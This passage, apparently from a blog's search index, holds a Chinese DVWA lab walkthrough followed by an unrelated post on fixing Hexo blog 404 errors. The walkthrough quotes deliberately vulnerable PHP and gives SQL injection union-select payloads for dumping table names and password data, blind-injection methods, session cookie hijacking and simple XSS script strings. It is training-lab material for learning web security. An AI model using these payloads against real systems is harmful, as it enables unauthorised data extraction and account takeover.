mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集中的值 while( $row = mysqli_fetch_assoc( $result ) ) { $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 显示给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 原理同暴力破解，因为没有对输入的参数id进行过滤，攻击者可以通过修改id的值来更改sql查询语句，但是实际运用中攻击者是不知道服务器端的查询语句的，这就需要一个个猜了 手工注入的大致流程1.判断注入点可以用2-1、1=1之类的逻辑判断来寻找是否有注入点 2.查询表的列数利用order by来判断列数 Order by num来判断 1′ or 1=1 order by 2 3.联合查询知道列名之后开始联合查询 比如列数为2 Union select version(),database() 4.爆表名1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 5.爆列名1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ 6.爆数据1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_GET[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_GET[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors // 获取结果集中的值 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 没有找到用户，返回一个错误页面 header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; ); // 客户端返回的错误提示 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 盲注的原理跟注入是一样的，区别在于没有从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知 这个时候我们就要用到ascii(）和substr（）函数来一个个猜 如果页面会返回正确或者错误的信息，可以基于布尔盲注，由返回的页面来判断是否猜对 如果没有返回信息，只能用sleep（）基于时间盲注，由响应的时间来判断是否正确 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; //获取session id if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { //如果没有session id则将session id设为0 if (!isset ($_SESSION[&apos;last_session_id&apos;])) { $_SESSION[&apos;last_session_id&apos;] = 0; } //累加session id $_SESSION[&apos;last_session_id&apos;]++; $cookie_value = $_SESSION[&apos;last_session_id&apos;]; //向客户端发送一个http cookie setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; session id的原理密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。此时的认证，只需要知道是哪个用户在浏览当前的页面即可。 SessionID一旦在生命周期内被窃取，攻击者利用这个id就可以伪装成合法的用户访问服务器 利用方法由核心代码可知服务器的sessionid是从0开始累加的 当受害者获得sessionid之后，攻击者只要在自己的浏览器上将sessionid改为受害者的即可 按f12打开控制台，在控制台输入 读取：document.cookie; 修改：document.cookie[“Key”]=”值”; PS：我在自己的电脑上没有成功，可能是服务器设置的问题，两个浏览器获取到的sessionid是独立的 XSS(DOM)XSS漏洞原理xss漏洞的原理是将js代码恶意插入到网页中，当受害者访问页面时，恶意的代码就会在浏览器上执行 根据恶意的代码是否存储在服务器中，xss可以分为两种类型，一种是反射性xss，一种是存储型xss DOM型由于其特殊性，常被分为第三种,它是基于DOM文档对象模型的一种漏洞 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 绕过DOM型服务器端没有代码 只要在get获取到的参数后面加上js代码就行 http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 结果就是会出现一个弹框，内容为xss 修改xss里面的内容，改成各种函数，可以达到盗取服务器信息的目的 ps：在谷歌浏览器上做会失败，因为谷歌浏览器自带了防xss的机制，用火狐浏览器就可以做到了 XSS (Reflected)反射型xss 核心代码: &lt;?php //向客户端发送原始的 HTTP 报头 header (&quot;X-XSS-Protection: 0&quot;); // 检测get中是否有值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 反馈给用户 echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } 原理同DOM型XSS 在框里输入&lt;script&gt;alert(/xss/)&lt;/script&gt;出现弹框 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { //获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化输入的名称，同上 $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 存储型XSS因为是将js代码存在服务器上，每当有人访问了这个带有恶意代码的页面，xss就会被触发，所以传播的范围更广 直接在message栏中输入&lt;script&gt;alert(/xss/)&lt;/script&gt;也可以弹窗了在name行输入也行，但是name行有限制，可以通过抓包改包破除这个限制","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"搭博客过程中遇到的一些问题","slug":"problem","date":"2018-07-05T03:51:37.336Z","updated":"2018-07-13T11:12:03.026Z","comments":true,"path":"2018/07/05/problem/","link":"","permalink":"https://perfect.xyz/2018/07/05/problem/","excerpt":"求求你不要再404了.jpg","text":"求求你不要再404了.jpg 404搭建的过程中遇到过两次404的问题第一次是因为域名因为我的Github的用户名是a+qq号，最后出来的域名就很Low搭建的时候刚好在听perfect time这首歌，于是就决定作为我的项目名称建完之后访问perfect-time.github.io却怎么也访问不到一开始以为是没有绑定域名的缘故，花了3块钱在tx那里买了个xyz的域名，结果还是404最后重新建了一个项目，乖乖的填了自己的用户名才成功 第二次是发生在建完之后，hexo g -d之后突然又404了因为会出现404，所以连到Github的过程中没有问题能够本地运行，博客本身没有问题排查了半天之后发现是CNAME的缘故CNAM不能直接放在hexo目录下，要放到/source这个目录里面Github只会上传/source这个文件夹里面的更改，放在其他地方是没办法上传到服务器的上传不到服务器的结果就是Github域名解析不到博客的地址，但是在Dns这边是将博客地址转换成了域名地址，所以会出现404的情况总的来说就是一个粗心，本来一个下午就可以搞完的东西拖了两天才搞完 邮件联系方式中有邮件，想着以后说不定会有人发邮件给我，就把自己的邮件地址放了上去但是单单只放邮件地址会出现无事发生的情况网页的跳转肯定是以htpp协议封装的，邮件地址显然不认识http协议参考了学姐(大概)的博客，发现qq邮箱有一个邮我的功能，点开这个链接可以直接给我发邮件，这个功能很神奇尝试设置了一下之后发现根本跳转不到邮我的界面，肯定是链接出了什么问题这个问题还没解决 其他一些小问题版权声明在hexo目录下的_config文件中更改，就在最上面的Site和URL 文章摘要用&lt;!-- more --&gt;代码来实现，不用这个代码的话会把文章的内容全部显示在摘要里，而且不换行，特别难看 Markdown语法中，#后面必须跟着空格才能显示为标题，不然只会显示一个# 用了来必力的评论系统，本地运行是正常的，但是传到服务器上就不行了，原因不明 2018/7/7更新去掉了来必力的评论系统，看了几个博客之后发现好像Gitment比较受欢迎，就换成了Gitment系统 需要注意的是gitment_client_id和gitment_client_secret 在注册之后就会给你了 gitment_owner:填自己github账号 gitment_repo: 存储评论的库，按理说这个也可以另外再建一个库，不过我为了以防万一就直接用博客的库了 这个评论系统好像可以汉化，懒得弄了 持续更新中~","categories":[{"name":"其他","slug":"其他","permalink":"https://perfect.xyz/categories/其他/"}],"tags":[]}]}